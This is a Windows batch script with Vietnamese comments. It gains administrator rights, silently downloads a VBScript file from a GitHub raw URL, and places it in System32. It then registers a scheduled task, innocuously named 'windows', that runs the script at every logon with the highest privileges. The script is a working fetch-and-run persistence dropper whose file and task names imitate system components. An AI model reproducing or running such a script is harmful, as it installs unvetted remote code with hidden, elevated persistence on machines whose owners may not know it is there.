@echo off
:: Kiểm tra quyền quản trị
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Vui lòng chạy với quyền quản trị.
    powershell -command "Start-Process cmd -ArgumentList '/c %~f0' -Verb RunAs"
    exit
)

:: Thiết lập biến
set "winsysUrl=https://raw.githubusercontent.com/quannqttg/coccoc/main/winsys.vbs"
set "destinationDir=C:\Program Files\Windows NT\ADB"
set "winsysDownloadFile=winsys.vbs"
set "logFile=%destinationDir%\task_history_log.txt"

:: Tạo thư mục nếu chưa tồn tại
if not exist "%destinationDir%" (
    echo %date% %time% - Thư mục %destinationDir% không tồn tại. Đang tạo thư mục... >> "%logFile%"
    mkdir "%destinationDir%"
)

:: Chuyển đến thư mục đích
cd /d "%destinationDir%"

:: Tải xuống tệp winsys.vbs
echo %date% %time% - Bắt đầu tải xuống winsys.vbs từ %winsysUrl% >> "%logFile%"
curl -L -o "%winsysDownloadFile%" "%winsysUrl%" >nul 2>&1

:: Kiểm tra xem tệp winsys.vbs đã tải xuống thành công chưa
if exist "%winsysDownloadFile%" (
    echo %date% %time% - winsys.vbs đã tải xuống thành công. >> "%logFile%"
    
    :: Di chuyển winsys.vbs vào C:\Windows\System32
    move /y "%winsysDownloadFile%" "C:\Windows\System32\%winsysDownloadFile%" >nul 2>&1
    
    if exist "C:\Windows\System32\%winsysDownloadFile%" (
        echo %date% %time% - winsys.vbs đã được di chuyển thành công vào System32. >> "%logFile%"
    ) else (
        echo %date% %time% - Di chuyển winsys.vbs thất bại. >> "%logFile%"
        exit
    )
) else (
    echo %date% %time% - Tải xuống winsys.vbs thất bại. >> "%logFile%"
    exit
)

:: Tạo tác vụ trong Task Scheduler để chạy winsys.vbs bằng wscript.exe
echo %date% %time% - Đang tạo tác vụ trong Task Scheduler... >> "%logFile%"
schtasks /create /tn "windows" /tr "\"C:\Windows\System32\wscript.exe\" \"C:\Windows\System32\%winsysDownloadFile%\"" /sc onlogon /ru "%USERNAME%" /RL HIGHEST /F >nul 2>&1

:: Kiểm tra kết quả tạo tác vụ
if %errorlevel% neq 0 (
    echo %date% %time% - Tạo tác vụ thất bại với mã lỗi %errorlevel%. >> "%logFile%"
    echo Tạo tác vụ thất bại.
) else (
    echo %date% %time% - Tác vụ đã được tạo thành công. >> "%logFile%"
    echo Tác vụ đã được tạo thành công.
)

exit
